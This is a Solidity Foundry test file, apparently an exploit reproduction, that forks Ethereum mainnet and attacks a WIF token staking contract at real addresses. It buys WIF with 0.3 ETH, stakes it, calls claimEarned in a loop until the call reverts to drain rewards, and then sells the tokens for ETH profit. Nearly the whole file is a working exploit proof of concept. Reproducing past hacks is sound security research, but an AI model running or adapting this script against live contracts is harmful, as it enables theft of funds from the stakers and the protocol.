pragma solidity ^0.8.10;

import "../basetest.sol";
import "./../interface.sol";

interface WIFStaking is IERC20 {
    function stake(uint256 _stakingId, uint256 _amount) external;
    function claimEarned(uint256 _stakingId, uint256 _burnRate) external;
}

contract WIFCOIN_ETHExploit is BaseTestWithBalanceLog {
    WIFStaking WifStake = WIFStaking(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99);
    IERC20 Wif = IERC20(0xBFae33128ecF041856378b57adf0449181FFFDE7);

    Uni_Router_V2 router = Uni_Router_V2(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));
    uint256 ethFlashAmt = 0.3 ether;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 20_103_189);
        Wif.approve(address(router), type(uint256).max);
        Wif.approve(address(WifStake), type(uint256).max);
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //Paths
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(router.WETH()); // weth
        buyPath[1] = address(Wif); // token
        address[] memory sellPath = new address[](2);
        sellPath[0] = buyPath[1];
        sellPath[1] = buyPath[0];

        //set ethbal to 0.3 eth to buy tokens
        vm.deal(address(this), ethFlashAmt);
        router.swapExactETHForTokens{value: ethFlashAmt}(0, buyPath, address(this), block.timestamp);

        WifStake.stake(3, Wif.balanceOf(address(this)));
        while (true) {
            try WifStake.claimEarned(3, 10) {}
            catch {
                break;
            }
        }

        router.swapExactTokensForETH(Wif.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp);

        //Remove initial flash eth to get actual ETH profit
        vm.deal(address(this), address(this).balance - ethFlashAmt);
    }
}
